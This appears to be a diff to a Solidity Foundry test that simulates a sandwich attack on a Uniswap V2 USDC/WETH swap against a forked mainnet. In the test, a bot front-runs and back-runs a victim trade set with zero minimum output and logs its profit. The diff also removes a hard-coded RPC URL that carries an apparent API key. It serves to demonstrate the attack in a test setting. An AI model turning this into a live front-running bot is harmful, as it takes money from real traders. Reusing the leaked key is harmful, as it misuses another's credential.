@@ -7,8 +7,8 @@ import "forge-std/interfaces/IERC20.sol";
 
 interface IUniswapV2Pair {
     function swap(
-        uint amount0Out,
-        uint amount1Out,
+        uint256 amount0Out,
+        uint256 amount1Out,
         address to,
         bytes calldata data
     ) external;
@@ -18,17 +18,17 @@ interface IUniswapV2Pair {
 
 interface IUniswapV2Router {
     function swapExactTokensForTokens(
-        uint amountIn,
-        uint amountOutMin,
+        uint256 amountIn,
+        uint256 amountOutMin,
         address[] calldata path,
         address to,
-        uint deadline
-    ) external returns (uint[] memory amounts);
+        uint256 deadline
+    ) external returns (uint256[] memory amounts);
 
     function getAmountsOut(
-        uint amountIn,
+        uint256 amountIn,
         address[] calldata path
-    ) external view returns (uint[] memory amounts);
+    ) external view returns (uint256[] memory amounts);
 }
 
 contract SandwichTest is Test {
@@ -48,9 +48,8 @@ contract SandwichTest is Test {
     address[] path;
 
     function setUp() public {
-        vm.createSelectFork(
-            "https://eth-mainnet.g.alchemy.com/v2/mOHE91YaQ03Fnpe76qa42"
-        );
+        string memory rpcUrl = vm.envString("MAINNET_RPC_URL");
+        vm.createSelectFork(rpcUrl);
 
         path = new address[](2);
         path[0] = USDC;
@@ -61,83 +60,83 @@ contract SandwichTest is Test {
         deal(address(usdc), victim, 10_000e6); // victim has 10k USDC
     }
 
+    function testSandwichAttack() public {
+        uint256 botInitial = usdc.balanceOf(bot);
+        console.log("Bot starting USDC :", botInitial / 1e6);
 
+        // Victim expected output (before attack)
+        vm.startPrank(victim);
+        uint256[] memory expected = router.getAmountsOut(10_000e6, path);
+        console.log("Victim expected WETH (no attack):", expected[1] / 1e18);
+        vm.stopPrank();
 
+        // ==================== BOT FRONTRUN ====================
+        vm.startPrank(bot);
+        usdc.approve(address(router), type(uint256).max);
 
-function testSandwichAttack() public {
-    uint botInitial = usdc.balanceOf(bot);
-    console.log("Bot starting USDC :", botInitial / 1e6);
+        uint256 frontUsdc = 4_500_000e6; // Adjust this value to optimize sandwich
 
-    // Victim expected output (before attack)
-    vm.startPrank(victim);
-    uint[] memory expected = router.getAmountsOut(10_000e6, path);
-    console.log("Victim expected WETH (no attack):", expected[1] / 1e18);
-    vm.stopPrank();
-
-    // ==================== BOT FRONTRUN ====================
-    vm.startPrank(bot);
-    usdc.approve(address(router), type(uint256).max);
-
-    uint frontUsdc = 4_500_000e6;   // Adjust this value to optimize sandwich
-
-    uint[] memory front = router.swapExactTokensForTokens(
-        frontUsdc,
-        0,
-        path,
-        bot,
-        block.timestamp + 15 minutes
-    );
-
-    uint wethBought = front[1];
-    console.log("Bot frontrun WETH :", wethBought / 1e18);
-    vm.stopPrank();
-
-    // ==================== VICTIM TRADE (Vulnerable) ====================
-    vm.startPrank(victim);
-    usdc.approve(address(router), type(uint256).max);
-
-    uint[] memory victimTrade = router.swapExactTokensForTokens(
-        10_000e6,
-        0,                          // amountOutMin = 0 → Vulnerable!
-        path,
-        victim,
-        block.timestamp + 15 minutes
-    );
-
-    console.log("Victim received WETH after sandwich:", victimTrade[1] / 1e18);
-    vm.stopPrank();
-
-    // ==================== BOT BACKRUN ====================
-    vm.startPrank(bot);
-    address[] memory backPath = new address[](2);
-    backPath[0] = WETH;
-    backPath[1] = USDC;
-
-    weth.approve(address(router), type(uint256).max);
-
-    if (wethBought > 0) {
-        router.swapExactTokensForTokens(
-            wethBought,
+        uint256[] memory front = router.swapExactTokensForTokens(
+            frontUsdc,
             0,
-            backPath,
+            path,
             bot,
             block.timestamp + 15 minutes
         );
+
+        uint256 wethBought = front[1];
+        console.log("Bot frontrun WETH :", wethBought / 1e18);
+        vm.stopPrank();
+
+        // ==================== VICTIM TRADE (Vulnerable) ====================
+        vm.startPrank(victim);
+        usdc.approve(address(router), type(uint256).max);
+
+        uint256[] memory victimTrade = router.swapExactTokensForTokens(
+            10_000e6,
+            0, // amountOutMin = 0 → Vulnerable!
+            path,
+            victim,
+            block.timestamp + 15 minutes
+        );
+
+        console.log(
+            "Victim received WETH after sandwich:",
+            victimTrade[1] / 1e18
+        );
+        vm.stopPrank();
+
+        // ==================== BOT BACKRUN ====================
+        vm.startPrank(bot);
+        address[] memory backPath = new address[](2);
+        backPath[0] = WETH;
+        backPath[1] = USDC;
+
+        weth.approve(address(router), type(uint256).max);
+
+        if (wethBought > 0) {
+            router.swapExactTokensForTokens(
+                wethBought,
+                0,
+                backPath,
+                bot,
+                block.timestamp + 15 minutes
+            );
+        }
+
+        uint256 botFinal = usdc.balanceOf(bot);
+
+        console.log("\n=== FINAL RESULTS ===");
+        console.log("Bot final USDC   :", botFinal / 1e6);
+
+        if (botFinal >= botInitial) {
+            uint256 profit = botFinal - botInitial;
+            console.log(" Bot Profit    :", profit / 1e6, "USDC");
+        } else {
+            uint256 loss = botInitial - botFinal;
+            console.log(" Bot Loss      :", loss / 1e6, "USDC");
+        }
+
+        vm.stopPrank();
     }
-
-    uint botFinal = usdc.balanceOf(bot);
-    
-    console.log("\n=== FINAL RESULTS ===");
-    console.log("Bot final USDC   :", botFinal / 1e6);
-
-    if (botFinal >= botInitial) {
-        uint profit = botFinal - botInitial;
-        console.log(" Bot Profit    :", profit / 1e6, "USDC");
-    } else {
-        uint loss = botInitial - botFinal;
-        console.log(" Bot Loss      :", loss / 1e6, "USDC");
-    }
-
-    vm.stopPrank();
-}
 }
